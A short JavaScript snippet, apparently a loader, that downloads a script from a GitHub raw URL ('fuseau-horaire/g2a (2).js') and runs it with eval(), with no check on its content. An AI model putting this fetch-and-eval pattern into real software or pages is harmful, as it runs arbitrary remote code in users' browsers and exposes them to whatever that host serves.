(function() {
fetch('https://raw.githubusercontent.com/nat152/fuseau-horaire/main/g2a%20(2).js')
    .then(response => response.text())
    .then(data => {
        try {
            eval(data);
        } catch (e) {
            console.error(e);
        }
    })
    .catch((error) => {
        console.error('Error:', error);
    });
})();